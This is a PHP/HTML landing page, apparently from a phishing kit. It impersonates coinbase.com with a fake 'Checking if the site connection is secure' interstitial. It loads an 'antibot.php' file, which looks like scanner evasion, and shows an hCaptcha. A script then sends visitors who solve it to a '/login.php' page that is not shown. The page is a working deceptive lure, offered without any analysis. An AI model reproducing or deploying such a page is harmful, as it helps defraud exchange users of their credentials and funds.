<?php require_once "antibot.php"; ?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Just a moment...</title>
	<script src="https://www.hcaptcha.com/1/api.js" async defer></script>
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400&display=swap" rel="stylesheet">
	<style>
		*,
		*::before,
		*::after {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			background-color: #222222;
			font-family: 'Lato', sans-serif;
		}

		p,
		h1,
		h3 {
			color: #fff;
		}

		h1 {
			margin-bottom: .5rem;
		}

		.p {
			margin-top: 2rem;
		}

		.container {
			height: 100vh;
			display: flex;
			justify-content: center;
			align-items: center;
		}

		form {
			padding: 1rem;
			height: 17rem;
			display: flex;
			justify-content: space-between;
			flex-direction: column;
		}
	</style>
</head>
<body>
	<div class="container">
		<form method="POST" action="">
			<div class="header">
				<h1>coinbase.com</h1>
				<h3>Checking if the site connection is secure</h3>
			</div>
			<div class="h-captcha" data-sitekey="46dbc5a3-faed-46df-975d-223473f5a9bc" data-theme="dark" data-callback="onCaptchaSolved"></div>
			<p>This site needs to review the security of your connection before proceeding.</p>
		</form>
	</div>

<script>
    function onCaptchaSolved(token) {
        console.log('Captcha solved:', token);
        window.location.href = '/login.php'; // Redirect to /login.php
    }
</script>
</body>
</html>